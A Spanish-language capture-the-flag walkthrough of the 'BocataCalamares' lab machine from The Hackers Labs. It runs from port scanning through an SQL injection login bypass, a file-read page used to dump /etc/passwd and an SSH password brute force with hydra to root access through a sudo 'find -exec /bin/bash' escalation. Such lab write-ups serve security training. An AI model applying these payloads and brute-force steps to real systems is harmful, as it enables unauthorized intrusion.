
# Writeup Template: Maquina `[ BocataCalamares ]`
- **Enumeración de servicios**: Identificación de los servicios que corren en los puertos abiertos, incluyendo versiones.
- **Escaneo de puertos TCP**: Detección de puertos abiertos en la máquina objetivo mediante escaneo TCP.
- **Fuzzing de rutas web**: Ataque de fuerza bruta sobre rutas de la web para descubrir archivos o directorios.
- **Inyección SQL**: Manipulación de consultas SQL para acceder a datos o evadir autenticaciones.

- Tags: #BocataCalamares
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.35
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.35 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.35
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.35 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.35 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 192.168.100.35 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```
---

## Enumeracion de [Servicio Nginx Principal]
Nginx (pronunciado "engine-ex") es un software de servidor web de código abierto que también funciona como proxy inverso, balanceador de carga y caché HTTP. Originalmente diseñado para manejar un alto volumen de conexiones concurrentes, Nginx es conocido por su alto rendimiento y eficiencia.
direccion **URL** del servicio:
```bash
http://192.168.100.35/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.35/
http://192.168.100.35/ [200 OK] Country[RESERVED][ZZ], Email[administrador@FKN.com,contacto@ejemplo.com], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[192.168.100.35], Meta-Author[RMH], Title[AFN], nginx[1.24.0]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 192.168.100.35
```

Resultado:
```bash
/admin.php: Possible admin folder
/login.php: Possible admin folder
```

Si accedemos a panel de login en la siguiente ruta:
```bash
http://192.168.100.35/login.php
```

Ahora probramos las credenciales por defecto:
```bash
admin: admin
root: root
administrator: administrator
admin123: amdin123
```

viendo que no tenemos credenciales probraremos el panel para determinar si es vulnerable a **SQLInjection**, Asi que colamos un comilla en el apartado del usaurio para var como es que reacciona
```bash
usernamne: admin'
password: admin
```

En la respuesta del servidor vemos lo siguiente:
```sql
**Fatal error**: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1 in /var/www/html/login.php:101 Stack trace: #0 /var/www/html/login.php(101): mysqli_query() #1 {main} thrown in **/var/www/html/login.php** on line **101**
```

Ahora sabemos que por detras corre **MySQL**, Asi que podemos intentar loguearnos sin proporcionar contrasena de la sigueinte manera:
```bash
username: admin' or 1=1-- -
password: cualquiercontrasena
```

Logramos ganar acceso al panel del administrador
```bash
http://192.168.100.35/admin.php
```

Ingresamondo vemos lo siguiente:
```bash
# Bienvenido administrador

## Día 1
Ya he conseguido que solo yo pueda acceder a este sitio, cada vez soy mejor. Para ser mi primer proyecto no está nada mal, dentro de poco tendré que pedir un aumento de sueldo.
Creo que lo mejor es que use esta pagina para apuntar todo lo que hay que hacer.
Aún tengo que terminar de dar estilo a la pagina de index, añadir el contenido de las noticias y crear una página dedicada a los usuarios.

## Día 2
Esto es demasiado chapucero para un programador de mi nivel, voy a crear una [to-do-list](http://192.168.100.35/todo-list.php) para ir cubriendo todos mis súper objetivos.
```

Vemos que existe una pagina **todoList** a la cual accedemos para ver lo siguiente:
```bash
# Lista de tareas

Pedir aumento de salario al jefe (soy demasiado bueno para cobrar esta miseria).  
 Reservar billetes verano.  
 He creado una nueva página para poder leer los ficheros internos del servidor, cada día soy un mejor programador. Además he codificado su nombre en base64, así nadie podrá dar con ella (lee_archivos).  
 Llevar al gato al veterinario, ese saco de pulgas se está comiendo la mitad de mi sueldo...
```

Ahora tenemos una pista del nombre: **( leer_archivos )** asi que procedemos a codificarlo en **base64**
```bash
echo "lee_archivos" | base64
bGVlX2FyY2hpdm9zCg==
```

Si ahora ingresmoa esto en al url si que tenemos capacidad de verlo
```bash
http://192.168.100.35/bGVlX2FyY2hpdm9zCg==.php
```

Tenemos una web que nos permite leer archivos, aprovechamos para ver el archivo **( /etc/passwd )**
```bash
root:x:0:0:root:/root:/bin/bash
tyuiop:x:1000:1000:tyuiop:/home/tyuiop:/bin/bash
superadministrator:x:1001:1001:,,,:/home/superadministrator:/bin/bash
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahroa que tenemos posibles usuarios validos para el sistema, crearemos un diccionario de usaurios para realizar fuerza bruta por **ssh** aprovechando que estan expuestos
```bash
# users.txt
tyuiop
superadministrator
root
```
### Ejecucion del Ataque
```bash
# Comandos para explotación
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://192.168.100.35
```

Contrasena encontrada:
```bash
[STATUS] 69.00 tries/min, 69 tries in 00:01h, 14344330 to do in 3464:49h, 4 active
[22][ssh] host: 192.168.100.35   login: superadministrator   password: princesa
```

### Intrusion
Nos conectamos por **ssh**
```bash
# Reverse shell o acceso inicial
ssh superadministrator@192.168.100.35 # ( princesa )
```

---

## Escalada de Privilegios

###### Usuario `[ Superadministrator ]`:
LIstando los archivos de este usuario:
```bash
cat recordatorio.txt 
Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante.
```

LIstando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User superadministrator may run the following commands on thehackerslabs-bocatacalamares:
    (ALL) NOPASSWD: /usr/bin/find
```

Nos aprovechamos de esto para ganar acceso como root
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/find . -exec /bin/bash \; -quit
```

---

## Evidencia de Compromiso
Flag de root
```bash
ls -la /root

-rw-r--r--  1 root root    13 Jan 10  2025 root.txt
```

```bash
# Captura de pantalla o output final
root@thehackerslabs-bocatacalamares:/home/superadministrator# echo -n "Hacked: "; whoami
Hacked: root
```